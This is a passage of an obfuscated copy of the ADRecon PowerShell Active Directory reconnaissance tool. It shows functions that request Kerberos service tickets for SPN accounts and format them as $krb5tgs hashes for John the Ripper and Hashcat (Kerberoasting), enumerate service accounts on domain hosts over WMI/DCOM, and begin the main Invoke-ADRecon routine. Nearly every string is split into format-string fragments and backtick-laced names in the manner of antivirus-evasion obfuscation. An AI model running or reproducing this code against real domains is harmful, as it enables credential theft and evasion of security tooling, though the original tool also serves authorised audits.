        $ObjSearcher."PA`GESi`zE" = $PageSize
        $ObjSearcher."f`i`LTEr" = ("{8}{0}{14}{7}{6}{3}{1}{5}{13}{4}{12}{11}{9}{2}{10}{15}" -f '(!','servic','6.1.4.80',')(','a','e','er','jectClass=comput','(&','0.11355','3:','ol:1.2.84','lName=*)(!userAccountContr','Princip','ob','=2))')
        $ObjSearcher."Pro`per`TIe`st`O`loAd".("{0}{1}" -f'AddRa','nge').Invoke((("{1}{2}{0}{3}" -f'she','d','istingui','dname'),("{4}{0}{3}{1}{2}" -f'a','ntnam','e','ccou','sam'),("{4}{0}{1}{3}{5}{2}{6}" -f 'erv','icep','nc','r','s','i','ipalname'),("{3}{1}{4}{0}{2}" -f 'ntro','oun','l','useracc','tco')))
        $ObjSearcher."se`ARcH`SCOPE" = ("{0}{1}" -f 'Su','btree')
        Try
        {
            $ADUsers = $ObjSearcher.("{0}{1}" -f'F','indAll').Invoke()
        }
        Catch
        {
            Write-Warning ("{7}{0}{11}{4}{5}{6}{9}{12}{8}{10}{1}{2}{3}" -f 'et','O','bject','s','ADRK','erb','er','[G','hile enumer','oast','ating UserSPN ','-','] Error w')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{2}{1}" -f'd','pose','is').Invoke()

        If ($ADUsers)
        {
            $UserSPNObj = @()
            $ADUsers | ForEach-Object {
                ForEach ($UserSPN in $_."pRopErT`i`Es"."SEr`Vi`CEP`RINciPAl`N`AME")
                {
                    $Obj = New-Object ("{1}{2}{0}" -f't','PS','Objec')
                    $Obj | Add-Member -MemberType ("{1}{0}{2}" -f'er','NoteProp','ty') -Name ("{1}{2}{0}"-f'e','User','nam') -Value $_."p`ROpeRTi`ES"."SAm`AcCoU`N`TNAmE"[0]
                    $Obj | Add-Member -MemberType ("{0}{1}{2}" -f'NoteP','r','operty') -Name ("{5}{1}{4}{3}{6}{2}{0}" -f 'Name','i','l','incip','cePr','Serv','a') -Value $UserSPN

                    $HashObj = Get-ADRSPNTicket $UserSPN
                    If ($HashObj)
                    {
                        $UserDomain = $_."PRoP`eRT`IeS"."DiSTInGU`is`HE`DnAme"[0]."s`Ub`sTring"($_."Pr`opErt`ies"."D`isTInGu`I`SH`EdnA`me"[0].("{2}{1}{0}" -f 'Of','dex','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        
                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        
                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.Properties.samaccountname)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        $JTRHash = $null
                        $HashcatHash = $null
                    }
                    $Obj | Add-Member -MemberType ("{2}{0}{3}{1}"-f 'ePr','erty','Not','op') -Name ("{0}{1}"-f 'Jo','hn') -Value $JTRHash
                    $Obj | Add-Member -MemberType ("{2}{1}{3}{0}"-f'y','rop','NoteP','ert') -Name ("{1}{0}{2}" -f'hca','Has','t') -Value $HashcatHash
                    $UserSPNObj += $Obj
                }
            }
            Remove-Variable ("{1}{0}" -f 'ers','ADUs')
        }
    }

    If ($LogonToken)
    {
        Get-ADRRevertToSelf -TokenHandle $LogonToken
    }

    If ($UserSPNObj)
    {
        Return $UserSPNObj
    }
    Else
    {
        Return $null
    }
}


Function GeT-`ADrDOmaiN`ACcoUNTSuS`EDFOrSeRvic`E`Lo`GOn
{

    param(
        [Parameter(MANdATory = $true)]
        [string] $Method,

        [Parameter(mAndAtory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MAnDAtoRy = $false)]
        [Management.Automation.PSCredential] $Credential =   ( gEt-variABLe K49p -valUE )::"EM`ptY",

        [Parameter(MandaTORY = $true)]
        [int] $PageSize,

        [Parameter(MAnDAtory = $false)]
        [int] $Threads = 10
    )

    BEGIN {
        $readServiceAccounts = [scriptblock] {
            
            $hostname = [string] $args[0]
            $OperatingSystem = [string] $args[1]
            
            $Credential = $args[2]
            $timeout = 250
            $port = 135
            Try
            {
                $tcpclient = New-Object ("{1}{0}{5}{2}{6}{3}{4}"-f'm.Net.So','Syste','ets.TcpCl','en','t','ck','i')
                $result = $tcpclient.("{1}{2}{0}"-f 'nect','Beg','inCon').Invoke($hostname,$port,$null,$null)
                $success = $result."AsYNcWa`it`hAn`D`lE".("{1}{0}"-f 'tOne','Wai').Invoke($timeout,$null)
            }
            Catch
            {
                $warning = "$hostname ($OperatingSystem) is unreachable $($_.Exception.Message) "
                $success = $false
                $tcpclient.("{0}{1}"-f'Cl','ose').Invoke()
            }
            If ($success)
            {
                
                If ($PSVersionTable."Psv`ErS`IoN"."MA`JoR" -ne 2)
                {
                    If ($Credential -ne  $K49P::"em`PtY")
                    {
                        $session = New-CimSession -ComputerName $hostname -SessionOption $(New-CimSessionOption -Protocol ("{1}{0}" -f 'COM','D')) -Credential $Credential
                        If ($session)
                        {
                            $serviceList = @( Get-CimInstance -ClassName ("{1}{3}{0}{2}" -f'32_Serv','Wi','ice','n') -Property ("{1}{0}" -f 'ame','N'),("{1}{2}{0}"-f 'ame','S','tartN'),("{0}{1}{2}" -f 'S','y','stemName') -CimSession $session -ErrorAction ("{1}{0}" -f'p','Sto'))
                        }
                    }
                    Else
                    {
                        $session = New-CimSession -ComputerName $hostname -SessionOption $(New-CimSessionOption -Protocol ("{0}{1}" -f 'DCO','M'))
                        If ($session)
                        {
                            $serviceList = @( Get-CimInstance -ClassName ("{2}{0}{1}" -f '32_Servi','ce','Win') -Property ("{1}{0}"-f'e','Nam'),("{1}{0}{2}"-f'am','StartN','e'),("{2}{1}{0}"-f 'e','temNam','Sys') -CimSession $session -ErrorAction ("{1}{0}" -f 'top','S') )
                        }
                    }
                }
                Else
                {
                    If ($Credential -ne   $K49p::"E`MpTY")
                    {
                        $serviceList = @( Get-WmiObject -Class ("{2}{4}{1}{0}{3}"-f 'c','vi','Win32_','e','Ser') -ComputerName $hostname -Credential $Credential -Impersonation 3 -Property ("{0}{1}"-f 'N','ame'),("{1}{0}"-f'rtName','Sta'),("{1}{0}{2}" -f 'Nam','System','e') -ErrorAction ("{0}{1}" -f'Sto','p') )
                    }
                    Else
                    {
                        $serviceList = @( Get-WmiObject -Class ("{0}{2}{1}" -f 'Win3','rvice','2_Se') -ComputerName $hostname -Property ("{0}{1}" -f 'Na','me'),("{0}{2}{1}"-f'Start','ame','N'),("{1}{0}{2}" -f'mNam','Syste','e') -ErrorAction ("{0}{1}"-f 'St','op') )
                    }
                }
                $serviceList
            }
            Try
            {
                If ($tcpclient) { $tcpclient.("{1}{0}{2}"-f 'nn','EndCo','ect').Invoke($result) | Out-Null }
            }
            Catch
            {
                $warning = "$hostname ($OperatingSystem) : $($_.Exception.Message) "
            }
            $warning
        }

        Function pRocE`s`S`CO`m`pLETedJobS()
        {
            
            

            $jobs = Get-Job -State ("{1}{2}{3}{0}"-f 'd','Com','plet','e')
            ForEach( $job in $jobs )
            {
                If ($null -ne $job)
                {
                    $data = Receive-Job $job
                    Remove-Job $job
                }

                If ($data)
                {
                    If ( $data.("{0}{1}{2}" -f 'G','etTyp','e').Invoke() -eq [Object[]] )
                    {
                        $serviceList = $data | Where-Object { if ($_."S`TArT`NAME") { $_ }}
                        $serviceList | ForEach-Object {
                            $Obj = New-Object ("{0}{2}{1}"-f'PS','t','Objec')
                            $Obj | Add-Member -MemberType ("{3}{2}{1}{0}"-f'rty','rope','eP','Not') -Name ("{1}{0}" -f 'ccount','A') -Value $_."star`T`NaME"
                            $Obj | Add-Member -MemberType ("{0}{3}{2}{1}" -f'N','ty','Proper','ote') -Name ("{3}{1}{0}{2}" -f 'vice','r',' Name','Se') -Value $_."N`AME"
                            $Obj | Add-Member -MemberType ("{0}{1}{2}" -f'NotePr','oper','ty') -Name ("{3}{1}{2}{0}"-f 'e','temN','am','Sys') -Value $_."SY`ste`Mn`AmE"
                            If ($_."ST`ARt`NAmE".("{0}{1}" -f'toUppe','r').Invoke().("{0}{1}{2}"-f'C','o','ntains').Invoke($currentDomain))
                            {
                                $Obj | Add-Member -MemberType ("{3}{0}{2}{1}" -f'eP','erty','rop','Not') -Name ("{3}{4}{0}{2}{1}" -f'Domain','er',' Us','R','unning as ') -Value $true
                            }
                            Else
                            {
                                $Obj | Add-Member -MemberType ("{2}{1}{0}{3}"-f 'p','Pro','Note','erty') -Name ("{0}{1}{3}{2}{4}"-f'Run','ni','in Us','ng as Doma','er') -Value $false
                            }
                            $script:serviceAccounts += $Obj
                        }
                    }
                    ElseIf ( $data.("{0}{1}"-f 'GetTy','pe').Invoke() -eq [String] )
                    {
                        $script:warnings += $data
                        Write-Verbose $data
                    }
                }
            }
        }
    }

    PROCESS
    {
        $script:serviceAccounts = @()
        [string[]] $warnings = @()
        If ($Method -eq ("{0}{1}" -f'A','DWS'))
        {
            Try
            {
                $ADDomain = Get-ADDomain
            }
            Catch
            {
                Write-Warning ("{4}{0}{12}{2}{3}{11}{14}{15}{6}{8}{13}{5}{9}{10}{16}{1}{7}"-f'et','oma','c','ou','[G','rro','ceLog','in Context','on','r ','getting','ntsus','-ADRDomainAc','] E','e','dforServi',' D')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            If ($ADDomain)
            {
                $currentDomain = $ADDomain."neT`B`IoSNAmE".("{1}{0}" -f'per','toUp').Invoke()
                Remove-Variable ("{2}{0}{1}" -f 'ai','n','ADDom')
            }
            Else
            {
                $currentDomain = ""
                Write-Warning ("{2}{7}{4}{1}{5}{0}{6}{3}" -f ' r','could not b','Cur','.','t Domain ','e','etrieved','ren')
            }

            Try
            {
                $ADComputers = Get-ADComputer -Filter { Enabled -eq $true -and ("{2}{0}{1}" -f 'ngSys','tem','Operati') -Like ("{0}{1}{2}" -f'*Win','dows','*') } -Properties ("{1}{0}" -f'me','Na'),("{0}{2}{1}{3}"-f'D','st','NSHo','Name'),("{4}{1}{2}{0}{3}"-f 'ys','erating','S','tem','Op')
            }
            Catch
            {
                Write-Warning ("{11}{10}{6}{24}{18}{13}{20}{25}{21}{3}{14}{7}{12}{5}{19}{17}{23}{1}{2}{16}{9}{15}{4}{22}{0}{8}" -f 'bject','n','dows',' ','uter ','wh','RDo','o','s','m','D','[Get-A','r ','forS','Err','p',' Co','le enum','inAccountsused','i','e','viceLogon]','O','erating Wi','ma','r')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }

            If ($ADComputers)
            {
                
                
                $cnt = $( $jwb18::("{1}{2}{0}" -f'ount','Objec','tC').Invoke($ADComputers))
                Write-Verbose ('[*'+'] '+'To'+'tal '+'Windows'+' '+'H'+'o'+'sts: '+"$cnt")
                $icnt = 0
                $ADComputers | ForEach-Object {
                    $StopWatch =   ( VAriAbLE tHlI4).valUE::("{2}{0}{1}" -f 'rtNe','w','Sta').Invoke()
                    If( $_."dn`sHOsTn`A`Me" )
	                {
                        $args = @($_."DNS`HostN`AMe", $_."o`pe`RaTinG`systEM", $Credential)
		                Start-Job -ScriptBlock $readServiceAccounts -Name "read_$($_.name)" -ArgumentList $args | Out-Null
		                ++$icnt
		                If ($StopWatch."E`laPs`eD"."tO`T`AlMill`ISeCO`N`dS" -ge 1000)
                        {
                            Write-Progress -Activity ("{2}{1}{7}{3}{8}{4}{0}{5}{6}" -f' f','i','Retr','n','ata','rom serve','rs','evi','g d') -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            $StopWatch.("{0}{1}"-f 'R','eset').Invoke()
                            $StopWatch.("{1}{0}" -f't','Star').Invoke()
		                }
                        while ( ( Get-Job -State ("{1}{0}{2}"-f 'nnin','Ru','g'))."Co`UNt" -ge $Threads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                

                Write-Progress -Activity ("{2}{5}{0}{1}{4}{6}{3}{7}" -f 'da','ta f','Retrievi','m serv','r','ng ','o','ers') -Status ("{8}{7}{2}{5}{12}{1}{11}{10}{3}{4}{6}{9}{0}"-f 'e...','gro','or','obs ','to ',' ','c','f','Waiting ','omplet','d j','un','back') -PercentComplete 100
                Wait-Job -State ("{0}{2}{1}"-f 'R','ning','un') -Timeout 30  | Out-Null
                Get-Job -State ("{0}{2}{1}"-f'R','nning','u') | Stop-Job
                processCompletedJobs
                Write-Progress -Activity ("{8}{1}{4}{3}{7}{5}{0}{6}{2}"-f'om','i','ers','dat','ng ','r',' serv','a f','Retriev') -Completed -Status ("{1}{0}" -f'Done','All ')
            }
        }

        If ($Method -eq ("{0}{1}"-f'LD','AP'))
        {
            $currentDomain = ([string]($objDomain."NA`ME")).("{1}{0}{2}"-f 'pp','toU','er').Invoke()

            $objSearcher = New-Object ("{9}{2}{1}{8}{7}{5}{4}{6}{3}{10}{0}" -f'rySearcher','tem','ys','ec','S','ectory','ervices.Dir','r','.Di','S','to') $objDomain
            $ObjSearcher."pa`gESi`ZE" = $PageSize
            $ObjSearcher."f`IL`TeR" = ((("{10}{15}{2}{12}{11}{7}{9}{1}{13}{14}{6}{3}{0}{8}{5}{4}"-f'(op','.2','ount','3:=2)','Windows*))','System=*','4.80','!userA','erating','ccountControl:1','(&(s','05306369)(','Type=8','.84','0.113556.1.','amAcc')))
            $ObjSearcher."pr`Op`ERTIE`st`oloAd".("{2}{0}{1}" -f'ang','e','AddR').Invoke((("{0}{1}" -f'nam','e'),("{3}{1}{2}{0}"-f 'ame','os','tn','dnsh'),("{2}{0}{4}{1}{3}" -f 'tin','t','opera','em','gsys')))
            $ObjSearcher."sEa`RChS`C`Ope" = ("{2}{1}{0}"-f 'btree','u','S')

            Try
            {
                $ADComputers = $ObjSearcher.("{0}{1}"-f'F','indAll').Invoke()
            }
            Catch
            {
                Write-Warning ("{18}{4}{9}{8}{5}{15}{2}{6}{12}{17}{10}{11}{7}{14}{1}{13}{0}{3}{16}"-f 'numerating Windows','ile','s',' Computer','-ADR','ainA','usedfo','n] Erro','m','Do','eLo','go','r',' e','r wh','ccount',' Objects','Servic','[Get')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.("{1}{0}"-f 'ose','disp').Invoke()

            If ($ADComputers)
            {
                
                
                $cnt = $(  ( gEt-varIaBle  s07D  -Value  )::("{2}{1}{0}" -f 'nt','ou','ObjectC').Invoke($ADComputers))
                Write-Verbose ('[*]'+' '+'Total'+' '+'Wi'+'n'+'dows '+'Ho'+'sts:'+' '+"$cnt")
                $icnt = 0
                $ADComputers | ForEach-Object {
                    If( $_."PrO`PER`TIES"."DNs`HOSt`NA`mE" )
	                {
                        $args = @($_."pR`o`PERTIES"."Dn`sHos`TnamE", $_."p`ROP`eRT`iES"."Op`er`ATiNGSy`ST`eM", $Credential)
		                Start-Job -ScriptBlock $readServiceAccounts -Name "read_$($_.Properties.name)" -ArgumentList $args | Out-Null
		                ++$icnt
		                If ($StopWatch."ela`PsED"."tO`TAlMiLL`isE`cONds" -ge 1000)
                        {
		                    Write-Progress -Activity ("{6}{0}{5}{1}{2}{4}{3}"-f'etri','ata',' from serv','s','er','eving d','R') -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            $StopWatch.("{1}{0}"-f't','Rese').Invoke()
                            $StopWatch.("{0}{1}"-f 'Sta','rt').Invoke()
		                }
		                while ( ( Get-Job -State ("{1}{2}{0}" -f 'ning','R','un'))."CoU`NT" -ge $Threads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                
                Write-Progress -Activity ("{0}{4}{1}{5}{3}{7}{2}{8}{6}" -f'R','i',' fr','vi','etr','e','m servers','ng data','o') -Status ("{6}{0}{4}{2}{5}{3}{7}{1}"-f'ting ','mplete...','or ','o c','f','background jobs t','Wai','o') -PercentComplete 100
                Wait-Job -State ("{2}{1}{0}"-f 'ng','unni','R') -Timeout 30  | Out-Null
                Get-Job -State ("{0}{1}" -f'Run','ning') | Stop-Job
                processCompletedJobs
                Write-Progress -Activity ("{4}{7}{1}{6}{8}{0}{2}{3}{5}" -f 't','v','a ','fro','R','m servers','in','etrie','g da') -Completed -Status ("{2}{0}{1}" -f'l D','one','Al')
            }
        }

        If ($script:serviceAccounts)
        {
            Return $script:serviceAccounts
        }
        Else
        {
            Return $null
        }
    }
}

Function R`E`MO`Ve-empty`ADrOuTp`U`TD`ir
{

    param(
        [Parameter(mANdAToRy = $true)]
        [string] $ADROutputDir,

        [Parameter(mandAtORy = $true)]
        [array] $OutputType
    )

    Switch ($OutputType)
    {
        'CSV'
        {
            $CSVPath  = -join($ADROutputDir,'\',("{2}{0}{1}"-f 'V-File','s','CS'))
            If (!(Test-Path -Path ((("{3}{0}{2}{1}{4}"-f'C','}','SVPath{1','{0}','*'))-f  [cHAr]36,[cHAr]92)))
            {
                Write-Verbose ('Remo'+'ve'+'d '+'E'+'mpty'+' '+'D'+'irec'+'t'+'ory '+"$CSVPath")
                Remove-Item $CSVPath
            }
        }
        'XML'
        {
            $XMLPath  = -join($ADROutputDir,'\',("{1}{0}{2}"-f '-F','XML','iles'))
            If (!(Test-Path -Path ((("{2}{1}{0}" -f'{1}*','0}XMLPath','{')) -F [ChaR]36,[ChaR]92)))
            {
                Write-Verbose ('R'+'emoved'+' '+'Emp'+'ty '+'Di'+'rec'+'tory '+"$XMLPath")
                Remove-Item $XMLPath
            }
        }
        ("{0}{1}" -f'JSO','N')
        {
            $JSONPath  = -join($ADROutputDir,'\',("{0}{1}{2}"-f 'JSON','-Fil','es'))
            If (!(Test-Path -Path ((("{0}{3}{1}{2}{4}"-f'{1','S','ONPath{0}','}J','*'))  -F[CHAR]92,[CHAR]36)))
            {
                Write-Verbose ('Remo'+'ve'+'d '+'Empty'+' '+'Directo'+'ry'+' '+"$JSONPath")
                Remove-Item $JSONPath
            }
        }
        ("{0}{1}"-f 'HT','ML')
        {
            $HTMLPath  = -join($ADROutputDir,'\',("{0}{1}{2}"-f 'H','TML','-Files'))
            If (!(Test-Path -Path ((("{3}{0}{2}{1}" -f '1}HTMLP','h{0}*','at','{'))  -F[cHar]92,[cHar]36)))
            {
                Write-Verbose ('Re'+'mo'+'ved '+'Emp'+'ty '+'Dir'+'e'+'ctory '+"$HTMLPath")
                Remove-Item $HTMLPath
            }
        }
    }
    If (!(Test-Path -Path ((("{4}{1}{3}{5}{0}{2}" -f'}','O','*','utputD','{0}ADR','ir{1'))  -F  [ChAR]36,[ChAR]92)))
    {
        Remove-Item $ADROutputDir
        Write-Verbose ('Rem'+'ove'+'d '+'Empt'+'y '+'D'+'ir'+'ect'+'ory '+"$ADROutputDir")
    }
}

Function G`eT-A`DrA`BOUT
{

    param(
        [Parameter(mANdaTOrY = $true)]
        [string] $Method,

        [Parameter(MANDATOry = $true)]
        [DateTime] $date,

        [Parameter(mANDatOrY = $true)]
        [string] $ADReconVersion,

        [Parameter(mandaTorY = $false)]
        [Management.Automation.PSCredential] $Credential =  (iTeM ("VArI"+"A"+"Bl"+"e:K49p")  ).VAlue::"Emp`Ty",

        [Parameter(MaNdaTOry = $true)]
        [string] $RanonComputer,

        [Parameter(MaNDATORY = $true)]
        [string] $TotalTime
    )

    $AboutADRecon = @()

    $Version = $Method + ("{2}{1}{0}" -f 'sion','r',' Ve')

    If ($Credential -ne  $k49P::"em`PTY")
    {
        $Username = $($Credential."U`sER`NamE")
    }
    Else
    {
        $Username = $(  $9LQ::"UseR`N`AmE")
    }

    $ObjValues = @(("{0}{1}" -f 'Dat','e'), $($date), ("{1}{2}{0}" -f'con','AD','Re'), ("{5}{8}{1}{6}{9}{0}{2}{4}{3}{7}"-f 'com','tps:/','/','econ/','adr','h','/github','ADRecon','t','.'), $Version, $($ADReconVersion), ("{0}{2}{1}"-f 'Ran ',' user','as'), $Username, ("{4}{1}{0}{3}{2}" -f ' on','n','ter',' compu','Ra'), $RanonComputer, ("{3}{0}{1}{2}"-f 'ecutio','n',' Time (mins)','Ex'), $($TotalTime))

    For ($i = 0; $i -lt $($ObjValues."CO`UnT"); $i++)
    {
        $Obj = New-Object ("{1}{0}{2}"-f 'bje','PSO','ct')
        $Obj | Add-Member -MemberType ("{1}{0}{2}" -f'e','NoteProp','rty') -Name ("{0}{2}{1}"-f'Ca','ry','tego') -Value $ObjValues[$i]
        $Obj | Add-Member -MemberType ("{1}{0}{2}" -f'ropert','NoteP','y') -Name ("{1}{0}" -f 'e','Valu') -Value $ObjValues[$i+1]
        $i++
        $AboutADRecon += $Obj
    }
    Return $AboutADRecon
}

Function INVOkE`-aD`Re`con
{

    param(
        [Parameter(mandatory = $false)]
        [string] $GenExcel,

        [Parameter(MANDaTorY = $false)]
        [ValidateSet({"{0}{1}"-f'ADW','S'}, {"{0}{1}" -f'L','DAP'})]
        [string] $Method = ("{0}{1}"-f 'A','DWS'),

        [Parameter(maNDAToRy = $true)]
        [array] $Collect,

        [Parameter(mAndATOry = $false)]
        [string] $DomainController = '',

        [Parameter(manDaTOry = $false)]
        [Management.Automation.PSCredential] $Credential =   ( Get-iteM  vArIabLe:K49p ).VALuE::"eM`Pty",

        [Parameter(MANdatOry = $true)]
        [array] $OutputType,

        [Parameter(MANDatoRY = $false)]
        [string] $ADROutputDir,

        [Parameter(MaNDATory = $false)]
        [int] $DormantTimeSpan = 90,

        [Parameter(mANDatOrY = $false)]
        [int] $PassMaxAge = 30,

        [Parameter(MandaTorY = $false)]
        [int] $PageSize = 200,

        [Parameter(MaNdAtoRy = $false)]
        [int] $Threads = 10,

        [Parameter(MAndatorY = $false)]
        [bool] $UseAltCreds = $false
    )

    [string] $ADReconVersion = ("{1}{0}"-f '4','v1.2')
    Write-Output ('[*]'+' '+'ADRe'+'con'+' '+"$ADReconVersion "+'b'+'y '+'Prasha'+'nt '+'Ma'+'hajan '+'(@prash'+'ant'+'3535'+')')

    If ($GenExcel)
    {
        If (!(Test-Path $GenExcel))
        {
            Write-Output ("{0}{3}{5}{1}{2}{9}{6}{8}{7}{4}" -f '[','ke-ADRe','con] Inva','Inv','ng','o','id P',' ... Exiti','ath','l')
            Return $null
        }
        Export-ADRExcel -ExcelPath $GenExcel
        Return $null
    }

    
    $SaveVerbosePreference = $script:VerbosePreference
    $script:VerbosePreference = ("{0}{4}{3}{1}{2}" -f'Sile','Co','ntinue','ly','nt')
    Try
    {
        If ($PSVersionTable."pS`Ve`RSioN"."Ma`jOR" -ne 2)
        {
            $computer = Get-CimInstance -ClassName ("{1}{3}{4}{0}{2}" -f'rSys','W','tem','in','32_Compute')
            $computerdomainrole = ($computer)."D`OMAIn`RoLE"
        }
        Else
        {
            $computer = Get-WMIObject ("{3}{4}{5}{1}{2}{0}" -f 'm','s','yste','wi','n32_c','omputer')
            $computerdomainrole = ($computer)."doMain`R`Ole"
        }
    }
    Catch
    {
        Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
    }
    If ($SaveVerbosePreference)
    {
        $script:VerbosePreference = $SaveVerbosePreference
        Remove-Variable ("{2}{1}{0}{4}{3}{5}" -f'v','a','S','osePreferenc','eVerb','e')
    }

    switch ($computerdomainrole)
    {
        0
        {
            [string] $computerrole = ("{1}{5}{6}{3}{2}{4}{0}" -f 'n','S','rk','lone Wo','statio','ta','nda')
            $Env:ADPS_LoadDefaultDrive = 0
            $UseAltCreds = $true
        }
        1 { [string] $computerrole = ("{2}{1}{0}{4}{3}{5}"-f 'ber ','m','Me','o','W','rkstation') }
        2
        {
            [string] $computerrole = ("{2}{3}{4}{0}{1}"-f 'e','r','Sta','nd','alone Serv')
            $UseAltCreds = $true
            $Env:ADPS_LoadDefaultDrive = 0
        }
        3 { [string] $computerrole = ("{3}{1}{0}{2}"-f 'er S','emb','erver','M') }
        4 { [string] $computerrole = ("{4}{2}{3}{6}{5}{1}{0}"-f'ler','l','ku','p Do','Bac','tro','main Con') }
        5 { [string] $computerrole = ("{4}{2}{0}{1}{5}{3}{6}" -f 'ary Do','main ','im','ont','Pr','C','roller') }
        ("{1}{0}"-f'fault','de') { Write-Output ("{5}{1}{3}{4}{0}{2}{6}" -f 'ld not b','puter Rol','e iden','e co','u','Com','tified.') }
    }

    $RanonComputer = "$($computer.domain)\$([Environment]::MachineName) - $($computerrole) "
    Remove-Variable ("{1}{0}{2}" -f 'omp','c','uter')
    Remove-Variable ("{3}{2}{1}{4}{0}" -f'ole','uter','mp','co','domainr')
    Remove-Variable ("{0}{3}{1}{2}"-f 'co','terrol','e','mpu')

    
    If (($DomainController -ne "") -or ($Credential -ne   $k49P::"EMP`TY"))
    {
        
        If (($Method -eq ("{0}{1}" -f'ADW','S')) -and (-Not $UseAltCreds))
        {
            $Env:ADPS_LoadDefaultDrive = 0
        }
        $UseAltCreds = $true
    }

    
    If ($Method -eq ("{0}{1}" -f'AD','WS'))
    {
        If (Get-Module -ListAvailable -Name ("{1}{2}{0}{3}"-f'r','ActiveDire','cto','y'))
        {
            Try
            {
                
                $SaveVerbosePreference = $script:VerbosePreference;
                $script:VerbosePreference = ("{0}{4}{3}{1}{2}"-f 'Sil','onti','nue','lyC','ent');
                Import-Module ("{4}{1}{2}{3}{0}" -f'ctory','c','tive','Dire','A') -WarningAction ("{0}{1}" -f'S','top') -ErrorAction ("{1}{0}" -f'top','S') | Out-Null
                If ($SaveVerbosePreference)
                {
                    $script:VerbosePreference = $SaveVerbosePreference
                    Remove-Variable ("{2}{0}{1}{3}" -f'eP','referen','SaveVerbos','ce')
                }
            }
            Catch
            {
                Write-Warning (("{2}{7}{14}{9}{4}{3}{19}{15}{22}{10}{1}{0}{20}{11}{12}{21}{17}{8}{18}{5}{6}{23}{24}{13}{16}" -f 'T ','m RSA','[','] ','econ','s)',' ','I','ministratio','e-ADR','ule fro','emot','e Ser','uin','nvok','or importing ActiveDirectory M','g with LDAP','d','n Tool','Err','(R','ver A','od','... Co','ntin'))
                $Method = ("{0}{1}"-f'L','DAP')
                If ($SaveVerbosePreference)
                {
                    $script:VerbosePreference = $SaveVerbosePreference
                    Remove-Variable ("{4}{2}{1}{0}{5}{3}" -f 'erb','eV','v','ce','Sa','osePreferen')
                }
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }
        Else
        {
            Write-Warning ("{25}{6}{4}{7}{33}{11}{18}{19}{12}{2}{3}{15}{26}{8}{13}{32}{9}{0}{30}{22}{27}{23}{24}{5}{29}{10}{21}{1}{17}{14}{16}{31}{28}{20}"-f'e S','o','o','dul','Recon]','ion ','voke-AD',' ActiveDi','rom RS','mot','i','e','M','AT (R','in','e','stalled .','t ','ct','ory ','ng with LDAP','s n','mi','st','rat','[In',' f','ni','. Continui','Tools) ','erver Ad','.','e','r')
            $Method = ("{0}{1}"-f 'LDA','P')
        }
    }

    
    
    $SaveDebugPreference = $script:DebugPreference
    $script:DebugPreference = ("{0}{4}{3}{2}{1}"-f'Sile','nue','ti','Con','ntly')
    Try
    {
        $Advapi32 = Add-Type -MemberDefinition $Advapi32Def -Name ("{0}{1}{2}" -f'Adva','pi3','2') -Namespace ("{0}{1}"-f 'ADRec','on') -PassThru
        $Kernel32 = Add-Type -MemberDefinition $Kernel32Def -Name ("{2}{0}{1}" -f 'er','nel32','K') -Namespace ("{0}{2}{1}" -f'AD','n','Reco') -PassThru
        
        $CLR = ( (vARiabLe  ('kL'+'Q') ).vaLUE::("{1}{2}{3}{0}"-f 'gAssembly','GetExe','c','utin').Invoke()."ImageR`UnTim`eVEr`SIon")[1]
        If ($Method -eq ("{0}{1}" -f 'AD','WS'))
        {
            
            If ($CLR -eq "4")
            {
                Add-Type -TypeDefinition $($ADWSSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    (  $klQ::("{5}{2}{4}{0}{3}{1}" -f'art','Name','dW','ial','ithP','Loa').Invoke(("{7}{3}{1}{2}{4}{0}{8}{5}{6}"-f'nage','t.Active','Di','crosof','rectory.Ma','e','nt','Mi','m')))."LO`caTI`On"
                    ( ( Get-VaRIaBLe Klq ).VALUe::("{2}{0}{3}{1}"-f 'rti','ame','LoadWithPa','alN').Invoke(("{4}{0}{1}{2}{5}{3}" -f 'ystem.D','irectory','Se','ces','S','rvi')))."lO`ca`TIon"
                    (  (  CHildItem  VaRiABlE:kLQ).vaLue::("{4}{2}{3}{0}{1}"-f 'tial','Name','dWi','thPar','Loa').Invoke(("{2}{0}{1}"-f'ystem.X','ML','S')))."L`oCaTi`ON"
                ))
            }
            Else
            {
                Add-Type -TypeDefinition $($ADWSSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ( $klQ::("{1}{0}{3}{2}"-f 'dWithPartialNa','Loa','e','m').Invoke(("{4}{6}{1}{0}{3}{5}{2}"-f 'tiveDi','t.Ac','ory.Management','r','Micros','ect','of')))."Lo`C`ATion"
                    (  ( dIR  VAriaBlE:klq ).vAlUE::("{0}{2}{3}{1}"-f 'LoadWit','me','hParti','alNa').Invoke(("{7}{5}{4}{1}{0}{3}{6}{2}" -f 'er','ryS','es','vi','.Directo','em','c','Syst')))."lOC`AtIon"
                    (  ( Get-vArIable ("kl"+"q") -vaL )::("{2}{4}{0}{1}{3}{5}"-f 'WithParti','al','Lo','N','ad','ame').Invoke(("{0}{1}{2}" -f 'Sys','tem','.XML')))."LOC`ATI`oN"
                )) -Language ("{0}{2}{1}"-f'CShar','ersion3','pV')
            }
        }

        If ($Method -eq ("{1}{0}"-f 'AP','LD'))
        {
            If ($CLR -eq "4")
            {
                Add-Type -TypeDefinition $($LDAPSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
